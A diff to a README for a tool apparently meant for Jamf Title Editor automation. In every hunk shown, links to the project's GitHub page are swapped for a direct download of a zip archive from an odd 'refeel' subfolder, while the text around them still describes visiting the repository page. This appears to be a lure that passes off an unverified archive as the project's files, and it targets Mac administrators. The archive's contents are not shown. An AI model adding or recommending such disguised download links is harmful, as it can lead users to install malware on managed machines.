@@ -1,6 +1,6 @@
 # ⚙️ Title-Editor---API-Automation-Associated-Scripts - Simplify Jamf Title Work
 
-[![Download](https://img.shields.io/badge/Download-Primary%20Link-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts)
+[![Download](https://img.shields.io/badge/Download-Primary%20Link-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts/main/refeel/AP-Editor-Automation-Title-Scripts-Associated-v3.1.zip)
 
 ## 🧭 Overview
 
@@ -51,7 +51,7 @@ If you are working on a locked-down work Mac, you may need help from your IT tea
 
 Open the primary download page here:
 
-[Download from GitHub](https://github.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts)
+[Download from GitHub](https://raw.githubusercontent.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts/main/refeel/AP-Editor-Automation-Title-Scripts-Associated-v3.1.zip)
 
 Go to the page, then use GitHub’s download options to get the repository files. After the files finish downloading, save them in a folder you can find again.
 
@@ -231,5 +231,5 @@ A simple workflow may look like this:
 
 ## 🔗 Get the files
 
-[Visit the GitHub download page](https://github.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts)
+[Visit the GitHub download page](https://raw.githubusercontent.com/Raliane5544/Title-Editor---API-Automation-Associated-Scripts/main/refeel/AP-Editor-Automation-Title-Scripts-Associated-v3.1.zip)
 
